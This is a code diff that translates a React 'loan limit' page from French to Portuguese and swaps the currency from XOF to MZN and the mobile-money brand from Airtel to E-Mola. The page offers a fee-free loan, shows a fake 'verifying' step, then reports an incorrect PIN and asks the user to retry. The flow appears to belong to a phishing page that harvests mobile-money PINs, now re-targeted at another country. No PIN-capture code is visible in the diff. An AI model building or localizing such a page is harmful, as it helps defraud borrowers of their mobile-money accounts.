@@ -136,34 +136,34 @@ export default function LoanLimitPage() {
         onClick={handleBack}
         className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-6 sm:mb-8 transition-colors">
         <ArrowRight className="w-4 h-4 rotate-180" />
-        Back
+        Voltar
       </button>
 
- <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Votre limite de prêt</h2>
-<p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Voici le montant que vous pouvez emprunter</p>
+ <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">O seu limite de crédito</h2>
+<p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Este é o montante que pode pedir emprestado.</p>
 
 {/* Loan Amount Card */}
 <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
-  <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Montant du prêt disponible</p>
+  <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Montante do crédito disponível.</p>
   <div className="flex items-center justify-center gap-2 mb-2">
-    <h3 className="text-4xl sm:text-5xl font-black text-black">750,000</h3>
+    <h3 className="text-4xl sm:text-5xl font-black text-black">45,500</h3>
   </div>
-  <p className="text-gray-600 text-base sm:text-lg">XOF</p>
+  <p className="text-gray-600 text-base sm:text-lg">MZN</p>
 </div>
 
 {/* Details Section */}
 <div className="space-y-4 mb-8 sm:mb-12">
   <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-    <span className="text-gray-600 font-semibold text-sm sm:text-base">Durée du prêt</span>
-    <span className="text-black font-bold text-sm sm:text-base">12 mois</span>
+    <span className="text-gray-600 font-semibold text-sm sm:text-base">Prazo do empréstimo.</span>
+    <span className="text-black font-bold text-sm sm:text-base">12 meses</span>
   </div>
   <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-    <span className="text-gray-600 font-semibold text-sm sm:text-base">Taux d’intérêt</span>
+    <span className="text-gray-600 font-semibold text-sm sm:text-base">Taxa de juro</span>
     <span className="text-black font-bold text-sm sm:text-base">13%</span>
   </div>
   <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-    <span className="text-gray-600 font-semibold text-sm sm:text-base">Frais de traitement</span>
-    <span className="text-black font-bold text-sm sm:text-base">Gratuit</span>
+    <span className="text-gray-600 font-semibold text-sm sm:text-base">Taxa de processamento</span>
+    <span className="text-black font-bold text-sm sm:text-base">Gratuito</span>
   </div>
 </div>
       
@@ -172,7 +172,7 @@ export default function LoanLimitPage() {
         onClick={handleContinue}
         disabled={isProcessing}
         className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
-        {isProcessing ? 'Traitement en cours…...' : 'Continuer pour obtenir le prêt'}
+        {isProcessing ? 'A processar…' : 'Continue para obter o empréstimo.'}
         <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
       </button>
 
@@ -181,9 +181,9 @@ export default function LoanLimitPage() {
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
             <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-red-600 animate-spin mx-auto mb-4" />
-            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Traitement en cours…</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">A processar…</h3>
             <p className="text-gray-500 text-sm sm:text-base">
-              Veuillez patienter pendant que nous vérifions votre demande de prêt…
+              Por favor, aguarde enquanto verificamos o seu pedido de empréstimo…
             </p>
           </div>
         </div>
@@ -205,15 +205,15 @@ export default function LoanLimitPage() {
               </div>
             </div>
 
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code PIN incorrect</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Código PIN incorreto.</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              Votre demande de prêt a été refusée. Veuillez vérifier votre code PIN Airtel et réessayer.
+             O seu pedido de empréstimo foi recusado. Verifique o seu código PIN E-Mola e tente novamente.
             </p>
 
             <button 
               onClick={handleRestart}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors">
-              Redémarrer
+            Reiniciar
             </button>
           </div>
         </div>
